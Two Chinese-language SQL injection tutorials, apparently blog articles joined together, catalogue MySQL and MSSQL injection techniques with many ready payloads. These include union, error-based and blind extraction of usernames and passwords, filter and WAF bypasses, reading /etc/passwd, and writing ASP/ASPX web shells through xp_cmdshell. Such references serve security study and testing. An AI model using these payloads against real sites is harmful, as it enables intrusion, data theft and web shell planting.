https://xz.aliyun.com/t/2869
# SQL 注入总结

## 0x01 什么是SQL注入
sql注入就是一种通过操作输入来修改后台操作语句达到执行恶意sql语句来进行攻击的技术。

## 0x02 SQL注入的分类
按变量类型分：数字型、字符型

按HTTP提交方式分：GET注入、POST注入、Cookie注入

按注入方式分
    报错注入
    盲注：布尔盲注、时间盲注
    union注入

编码问题：宽字节注入

## 0x03识别后台数据库
根据操作系统平台
sql server：Windows（IIS)
MySQL：Apache

根据web语言
Microsoft SQL Server：ASP和.Net
MySQL：PHP
Oracle/MySQL：java

## 0x04 MySQL 5.0以上和MySQL 5.0以下版本的区别
MySQL 5.0以上版本存在一个存储着数据库信息的信息数据库--INFORMATION_SCHEMA ，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。 而5.0以下没有。

information_schema
系统数据库，记录当前数据库的数据库，表，列，用户权限等信息

SCHEMATA
储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等

TABLES
储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等

COLUMNS
储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等

## 0x05 基本手工注入流程
要从select语句中获得有用的信息，必须确定该数据库中的字段数和那个字段能够输出，这是前提。

1. MySQL >= 5.0
（1）获取字段数
```sql
order by n  /*通过不断尝试改变n的值来观察页面反应确定字段数*/
```
（2）获取系统数据库名
在MySQL >5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中
```sql
select null,null,schema_name from information_schema.schemata
```
（3）获取当前数据库名
```sql
select null,null,...,database()
```
（4）获取数据库中的表
```sql
select null,null,...,group_concat(table_name) from information_schema.tables where table_schema=database()
or
select null,null,...,table_name from information_schema.tables where table_schema=database() limit 0,1
```
（5）获取表中的字段
这里假设已经获取到表名为user
```sql
select null,null,...,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'
```
（6）获取各个字段值
这里假设已经获取到表名为user，且字段为username和password
```sql
select null,null,...,group_concat(username,password) from users
```
2.MySQL < 5.0
MySQL < 5.0 没有信息数据库information_schema，所以只能手工枚举爆破（二分法思想）。

该方式通常用于盲注。

相关函数
length(str) ：返回字符串str的长度

substr(str, pos, len) ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始

mid(str,pos,len) ：跟上面的一样，截取字符串

ascii(str) ：返回字符串str的最左面字符的ASCII代码值

ord(str) ：将字符或布尔类型转成ascll码

if(a,b,c) ：a为条件，a为true，返回b，否则返回c，如if(1>2,1,0),返回0

（1）基于布尔的盲注
```sql
and ascii(substr((select database()),1,1))>64 /*判断数据库名的第一个字符的ascii值是否大于64*/
```
（2）基于时间的盲注
```sql
id=1 union select if(SUBSTRING(user(),1,4)='root',sleep(4),1),null,null /*提取用户名前四个字符做判断，正确就延迟4秒，错误返回1*/
```
## 0x06 常用注入方式
注释符：
```sql
#
-- (有空格)或--+
/**/
```
内联注释：
```sql
/*！...*/
```
union注入
```sql
id =-1 union select 1,2,3   /*获取字段*/
```
Boolean注入
```sql
id=1' substr(database(),1,1)='t'--+     /*判断数据名长度*/
```
报错注入
1 floor()和rand()
```sql
union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a       /*利用错误信息得到当前数据库名*/
```
2 extractvalue()
```sql
id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))
```
3 updatexml()
```sql
id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))
```
4 geometrycollection()
```sql
id=1 and geometrycollection((select * from(select * from(select user())a)b))
```
5 multipoint()
```sql
id=1 and multipoint((select * from(select * from(select user())a)b))
```
6 polygon()
```sql
id=1 and polygon((select * from(select * from(select user())a)b))
```
7 multipolygon()
```sql
id=1 and multipolygon((select * from(select * from(select user())a)b))
```
8 linestring()
```sql
id=1 and linestring((select * from(select * from(select user())a)b))
```
9 multilinestring()
```sql
id=1 and multilinestring((select * from(select * from(select user())a)b))
```
10 exp()
```sql
id=1 and exp(~(select * from(select user())a))
```
时间注入
```sql
id = 1 and if(length(database())>1,sleep(5),1)
```
堆叠查询注入
```sql
id = 1';select if(sub(user(),1,1)='r',sleep(3),1)%23
```
二次注入
假如在如下场景中，我们浏览一些网站的时候，可以现在注册见页面注册username=test'，接下来访问xxx.php?username=test'，页面返回id=22；

接下来再次发起请求xxx.php?id=22，这时候就有可能发生sql注入，比如页面会返回MySQL的错误。

访问xxx.php?id=test' union select 1,user(),3%23，获得新的id=40，得到user()的结果，利用这种注入方式会得到数据库中的值。

宽字节注入
利用条件：
[ ] 查询参数是被单引号包围的，传入的单引号又被转义符()转义，如在后台数据库中对接受的参数使用addslashes()或其过滤函数
[ ] 数据库的编码为GBK
利用方式
```sql
id = -1%df' union select 1,user(),3,%23
```
在上述条件下，单引号'被转义为%5c，所以就构成了%df%5c，而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。

Cookie注入
当发现在url中没有请求参数，单数却能得到结果的时候，可以看看请求参数是不是在cookie中，然后利用常规注入方式在cookie中注入测试即可，只是注入的位置在cookie中，与url中的注入没有区别。
Cookie: id = 1 and 1=1

base64注入
对参数进行base64编码，再发送请求。
说明：id=1'，1的base64编码为MSc=，而=的url编码为%3d，所以得到以下结果：
id=MSc%3d

XFF注入
XFF(X-Forward-For)，简称XFF头，它代表客户端真实的ip地址
X-Forward-For：127.0.0.1' select 1,2,user()

## 0x07 SQL注入绕过技术
大小写绕过

双写绕过

编码绕过（url全编码、十六进制）

内联注释绕过

关键字替换

逗号绕过

substr、mid()函数中可以利用from to来摆脱对逗号的利用；

limit中可以利用offset来摆脱对逗号的利用

比较符号( >、< )绕过（greatest、between and)

逻辑符号的替换（and=&& or=|| xor=| not=!）

空格绕过（用括号，+等绕过）

等价函数绕过

hex()、bin()=ascii()
concat_ws()=group_concat()
mid()、substr()=substring()
http参数污染（id=1 union select+1,2,3+from+users+where+id=1–变为id=1 union select+1&id=2,3+from+users+where+id=1–）

缓冲区溢出绕过 (id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36–+ 其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。。一般会存在临界值，其实这种方法还对后缀名的绕过也有用)



https://masterxsec.github.io/2017/05/10/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/
# SQL注入总结
SQL注入的攻击方式根据应用程序处理数据库返回内容的不同，可以分为可显注入、报错注入和盲注。

可显注入
攻击者可以直接在当前界面内容中获取想要获得的内容。

报错注入
数据库查询返回结果并没有在页面中显示，但是应用程序将数据库报错信息打印到了页面中，所以攻击者可以构造数据库报错语句，从报错信息中获取想要获得的内容。

盲注
数据库查询结果无法从直观页面中获取，攻击者通过使用数据库逻辑或使数据库库执行延时等方法获取想要获得的内容。

MySQL手工注入
判断注入点是否存在

数字型
url后输入
http://www.xxx.cn/list.php?page=4&id=524'            返回错误  
http://www.xxx.cn/list.php?page=4&id=524 and 1=1     返回正确
http://www.xxx.cn/list.php?page=4&id=524 and 1=2     返回错误
注意：数字型注入最多出现在ASP/PHP等弱类型语言中，弱类型语言会自动推导变量类型，例如，参数id=8，PHP会自动推导变量id的数据类型为int类型，那么id=8 and 1=1，则会推导为string类型，而对于java或者c#这类强类型语言，如果试图把一个字符串转换成int类型，则会抛出异常，无法继续运行。

字符型
url后输入
http://www.xxx.cn/list.php?page=4&cid=x'                         返回错误  
http://www.xxx.cn/list.php?page=4&cid=x' and 1=1 and '1'='1      返回正确
http://www.xxx.cn/list.php?page=4&cid=x' and 1=2 and '1'='1      返回错误

搜索型
输入框中输入
'                        返回错误
x%' and 1=1 and '%'='    返回正确
x%' and 1=2 and '%'='    返回错误

判断字段数
数字型
http://www.xxx.cn/list.php?page=4&id=524 order by 17        返回正确
http://www.xxx.cn/list.php?page=4&id=524 order by 18        返回错误
得出结论：字段数17。

字符型
http://www.xxx.cn/list.php?page=4&cid=x' order by 17 #       返回正确
http://www.xxx.cn/list.php?page=4&cid=x' order by 18 #       返回错误
得出结论：字段数17。

搜索型
x%' order by 17 #     返回正确
x%' order by 18 #     返回错误
得出结论：字段数17。

寻找可显示字段
数字型
http://www.xxx.cn/list.php?page=4&id=524 and 1=2 union select 1,2,3,4,5,6,7,8,9,....

字符型
http://www.xxx.cn/list.php?page=4&cid=x' and 1=2 union select 1,2,3,4,5,6,7,8,9,.... #

搜索型
x%' and 1=2 union select 1,2,3,4,5,6,7,8,9,.... #

查数据库名
数字型
http://www.xxx.cn/list.php?page=4&id=524 and 1=2 union select 1,2,database(),4,5,6,7,8,9,....

字符型
http://www.xxx.cn/list.php?page=4&cid=x' and 1=2 union select 1,2,database(),4,5,6,7,8,9,.... #

搜索型
x%' and 1=2 union select 1,2,database(),4,5,6,7,8,9,.... #

查数据库中表名
数字型
http://www.xxx.cn/list.php?page=4&id=524 and 1=2 union select 1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.tables where table_schema='数据库名'
数据库名也可以使用十六进制

字符型
http://www.xxx.cn/list.php?page=4&id=x' and 1=2 union select 1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.tables where table_schema='数据库名' #           
数据库名也可以使用十六进制

搜索型
小智%' and 1=2 union select 1,2,group_concat(table_name),4,5,6,7,8,9,.... from information_schema.tables where table_schema='数据库名' #
数据库名也可以使用十六进制

查表中的列名
数字型
http://www.xxx.cn/list.php?page=4&id=524 and 1=2 union select 1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.columns where table_name='表名'
表名也可以使用十六进制

字符型
http://www.xxx.cn/list.php?page=4&id=x' and 1=2 union select 1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from information_schema.columns where table_name='表名' #
表名也可以使用十六进制

搜索型
小智%' and 1=2 union select 1,2,group_concat(column_name),4,5,6,7,8,9,.... from information_schema.columns where table_name='表名' #                
表名也可以使用十六进制

查表中的数据
数字型
http://www.xxx.cn/list.php?page=4&id=524 and 1=2 union select 1,group_concat(username,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from 表名

字符型
http://www.xxx.cn/list.php?page=4&id=x' and 1=2 union select 1,group_concat(username,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from 表名 #

搜索型
x%' and 1=2 union select 1,2,group_concat(username,password),4,5,6,7,8,9,.... from 表名 #

显示版本：select version();
显示字符集：select @@character_set_database;
显示数据库show databases;
显示表名：show tables;
显示计算机名：select @@hostname;
显示系统版本：select @@version_compile_os;
显示mysql路径：select @@basedir;
显示数据库路径：select @@datadir;
显示root密码：select User,Password from mysql.user;
开启外连：GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;

MySQL函数利用
MySQL提供了load_file()函数，可以帮助用户快速读取文件，但是文件位置必须在服务器上，文件路径必须为绝对路径，而且需要root权限，SQL语句如下：
union select 1,load_file(‘/etc/passwd’),3,4,5 #
通常，一些防注入语句不允许单引号的出现，那么可以使用一下语句绕过：
union select 1,load_file(0x272F6574632F70617373776427),3,4,5 #
对路径进行16进制转换。

MSSQL手工注入
与MySQL注入不同的是，MySQL利用的爆出显示的字段，MSSQL利用的报错注入，插入恶意的sql语句，让查询报错，在报出的错误中，显示我们想要的信息。

注入点：
www.xxx.cn/xxx/xxx.aspx?id=1
查询数据库版本
@@version：MSSQL全局变量，表示数据库版本信息。
测试语句：
http://www.xxx.cn/xxx/xxx.aspx?id=1 and @@version>0
注意：“and @@vsersion>0”也可以写成“and 0/@@version>0”
报错信息：
在将 nvarchar 值 ‘Microsoft SQL Server 2008 R2 (SP3) - 10.50.6000.34 (X64) Aug 19 2014 12:21:34 Copyright (c) Microsoft Corporation Enterprise Edition (64-bit) on Windows NT 6.1 <X64 (Build 7601: Service Pack 1) (Hypervisor)‘ 转换成数据类型 int 时失败。
原因：
@@version是MSSQL的全局变量，如果我们在“?id=1”后面加上“and @@version>0”，那么“and”后面的语句会将“@@version”强制抓换成int类型与0比较大小，但是类型转换失败，所以就将数据库信息暴露出来。

查询计算机名称
@@servername：MSSQL全局变量，表示计算机名称。
报错信息：
在将 nvarchar 值 ‘WINDOWS-XXXXXX‘ 转换成数据类型 int 时失败。

查询当前数据库名称
db_name()：当前使用的数据库名称。
报错信息：
在将 nvarchar 值 ‘abc‘ 转换成数据类型 int 时失败。

查询当前连接数据库的用户
User_Name()：当前连接数据库的用户。
报错信息：
在将 nvarchar 值 ‘dbo‘ 转换成数据类型 int 时失败。
注意：
如果看到dbo，那么多半当前数据库的用户是dba权限。

查询其他数据库名称
爆其他数据库:
http://www.xxx.cn/xxx/xxx.aspx?id=1 and (SELECT top 1 Name FROM Master..SysDatabases)>0
报错信息：
在将 nvarchar 值 ‘master‘ 转换成数据类型 int 时失败。
再爆其他的数据库则这么写：
http://www.xxx.cn/xxx/xxx.aspx?id=1 and (SELECT top 1 Name FROM Master..SysDatabases where name not in ('master'))>0
继续的话要这么写：
http://www.xxx.cn/xxx/xxx.aspx?id=1 and (SELECT top 1 Name FROM Master..SysDatabases where name not in ('master','abc'))>0
查询数据库中的表名
查表名：
http://www.xxx.cn/xxx/xxx.aspx?id=1 and (select top 1 name from abc.sys.all_objects where type='U' AND is_ms_shipped=0)>0
报错信息：
在将 nvarchar 值 ‘depart‘ 转换成数据类型 int 时失败。
再爆其他表：
http://www.xxx.cn/xxx/xxx.aspx?id=1 and (select top 1 name from abc.sys.all_objects where type='U' AND is_ms_shipped=0 and name not in ('depart'))>0
在继续：
http://www.xxx.cn/xxx/xxx.aspx?id=1 and (select top 1 name from abc.sys.all_objects where type='U' AND is_ms_shipped=0 and name not in ('depart','worker'))>0
查询表中的列名或者是字段名
查字段名：
http://www.xxx.cn/xxx/xxx.aspx?id=1 and (select top 1 COLUMN_NAME from abc.information_schema.columns where TABLE_NAME='depart')>0
报错信息：
在将 nvarchar 值 ‘ID‘ 转换成数据类型 int 时失败。
再爆其他字段：
http://www.xxx.cn/xxx/xxx.aspx?id=1 and (select top 1 COLUMN_NAME from abc.information_schema.columns where TABLE_NAME='depart' and COLUMN_NAME not in('ID'))>0
再继续：
http://www.xxx.cn/xxx/xxx.aspx?id=1 and (select top 1 COLUMN_NAME from abc.information_schema.columns where TABLE_NAME='depart' and COLUMN_NAME not in('ID','NAME'))>0
爆数据
查询数据：
http://www.xxx.cn/xxx/xxx.aspx?id=1 and (select top 1 password from depart)>0
报错信息：
在将 nvarchar 值 ‘B5A1EF8730200F93E50F4F5DEBBCAC0B‘ 转换成数据类型 int 时失败。

写入一句话木马
如果数据的权限是dba，且知道网站路径的话，那么我们就可以用这个语句来写一句话木马进去：
asp木马：
http://www.xxx.cn/xxx/xxx.aspx?id=1;exec master..xp_cmdshell 'echo "<%@ LANGUAGE=VBSCRIPT %>;<%eval request(chr(35))%>''" > d:\KfSite\kaifeng\2.asp'--
aspx木马：
http://www.xxx.cn/xxx/xxx.aspx?id=1;exec master..xp_cmdshell 'echo "<%@ LANGUAGE=Jscript %>;<%eval(Request("sb"),"unsafe")%>''" >C:\inetpub\wwwroot\2.aspx' --
原理是sql server支持堆叠查询，利用xp_cmdshell可以执行cmd指令，cmd指令中用【echo 内容 > 文件】可以写文件到磁盘里面。

利用hex编码绕过WAF
http://www.xxx.com/xxx/xxx.aspx?username=xxx
利用火狐浏览器中的hackbar工具的Encoding底下的“HEX Encoding”轻松把字符串编码成为可以利用的hex，然后利用报错注入就可以注入这个网站。

爆数据库版本
select convert(int,@@version)
hex编码后：0x73656c65637420636f6e7665727428696e742c404076657273696f6e29
然后使用如下方式注入：
http://www.xxx.com/xxx/xxx.aspx?username=xxx';dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c404076657273696f6e29 eXeC(@s)–
报错信息：
在将 nvarchar 值 ‘Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) Apr 2 2010 15:48:46 Copyright (c) Microsoft CorporationStandard Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor)‘ 转换成数据类型 int 时失败。
注意后面的注入语句：
dEcLaRe @s vArChAr(8000) //声明一个局部变量@s，类型为varchar(8000)
sEt @s=0x73656c65637420636f6e7665727428696e742c404076657273696f6e29 //给@s赋值，为“select convert(int,@@version)”的十六进制编码
eXeC(@s) //调用函数exec()执行“@s”中的内容。

爆当前数据库
select convert(int,db_name())

爆当前用户
select convert(int,User_Name())

爆表
select convert(int,(select top 1 name from abc[数据库名].sys.all_objects where type=’U’ AND is_ms_shipped=0))
select convert(int,(select top 1 name from abc[数据库名].sys.all_objects where type=’U’ AND is_ms_shipped=0 and name not in (‘CMS_ArticleClass’)))

爆字段
select convert(int,(select top 1 COLUMN_NAME from abc[数据库名].information_schema.columns where TABLE_NAME=’CMS_Userinfo[表名]’))
select convert(int,(select top 1 COLUMN_NAME from abc[数据库名].information_schema.columns where TABLE_NAME=’CMS_Userinfo[表名]’ and COLUMN_NAME not in (‘id’)))

爆数据
select convert(int,(select top 1 username from CMS_Admin))
select convert(int,(select top 1 password from CMS_Admin))

SQL注入之你问我答小知识
1.id-1，页面如果返回正确页面说明是有注入，那+1可以吗？（www.test.com/xsn.php?id=12+1）
不行，因为加号在url里面是空格的意思。

2.你知道mysql里有几种注释方式吗？
三种：①.# 这个注释直到该行结束；②./注释多行/；③.–+ 这个注释直到该行结束。第三种需要解释一下，因为之前我不知道这个方法，说‘–’是注释符我还大概有印象，但是–+就懵。其实是– ，注意–的后面有一个空格。但是在url里你直接空格会被浏览器直接处理掉，就到不了数据库里。所以特意用加号代替。

3.“select select * from admin”可以执行吗？倘若不可以请说明。
不可以执行，在使用select双层的时候要把第二个括起来，否则无效。

4.倘若空格过滤了，你知道有哪些可以绕过吗？或者说你知道哪些可以替代空格吗？这些是空字符。比如un%0aion会被当做union来处理。
假如空格被过滤了，可能的sql语句就会变成：select from messages where uid=45or1=1，我们可以使用//来替换空格：
http://www.xxx.com/index.php?id=45//or/**/1=1
另外：
%09
%0A
%0D
+
/|–|/
/@–|/
/?–|/
/|%20–%20|/
都可以替代空格。

5.Windows下的Oracle数据库是什么权限？
Windows下的Oracle数据库，必须以system权限运行。

6.SQL注入和SQL盲注有何差别？
在常规的SQL注入中，应用返回数据库中的数据并呈现给你，而在SQL盲注漏洞中，你只能获取分别与注入中的真假条件相对应的两个不同响应，应用会针对真假条件返回不同的值，但是攻击者无法检索查询结果。

7.什么是引发SQL注入漏洞的主要原因？
Web应用未对用户提供的数据进行充分审查和未对输出进行编码是产生问题的主要原因。

8.什么是堆叠查询（stacked query）？
在单个数据库连接中，执行多个查询序列，是否允许堆叠查询是影响能否利用SQL注入漏洞的重要因素之一。在MYSQL中，SELECT * FROM members; DROP members；是可以执行的，数据库是肯定支持堆叠查询的，但是让php来执行堆叠查询的sql语句就不一定行了。

9.
/*! ... */
是啥意思？
MYSQL数据库特有，如果在注释的开头部分添加一个感叹号并在后面跟上数据库版本编号，那么该注释将被解析成代码，只要数据库版本高于或者等于注释中包含的版本，代码就会被执行。
select 1 /*!40119 + 1*/
该查询结果：
返回2(MySQL版本为4.01.19或者更高)
返回1（其他情况）

10.如果注入语句中的‘=’被过滤？
可以考虑使用like关键字替换：union select password from users where username like admin；

11.如果空格被过滤？
可以考虑使用‘/**/’替换：
union/**/select/**/password/**/from/**/users/**/where/**/username/**/like/**/admin；
注意，如果过滤了关键字，在MySQL中，还可以在关键字内部使用内联注释来绕过：
uni/**/on/**/sel/**/ect/**/password/**/fr/**/om/**/users/**/wh/**/ere/**/username/**/like/**/admin；

12.SQL注入中的‘+’？
MSSQL：在MSSQL中，“+”运算符被用于字符串连接和加法运算，‘1’+‘1’=‘11’，1+1=2；
MySQL：在MySQL中，“+”运算符只被用于加法运算，‘1’+‘1’=‘2’，1+1=2；
Oracle：在Oracle中，“+”运算符只被用于加法运算，‘1’+‘1’=‘2’，1+1=2。

13.数据库中字符串的连接符？
MSSQL：‘a’+‘b’=‘ab’
MYSQL：‘a’ ‘b’=‘ab’
Oracle：‘a’||‘b’=‘ab’

14.注释符
MSSQL：‘-- ’(注意后面的空格)，‘/*...*/’
MySQL：‘-- ’,‘# ’,‘/*...*/’，注意，--后面必须要有一个或者多个空格。
Oracle：‘-- ’,‘/*...*/’
三种数据库中，通用的注释符是‘-- ’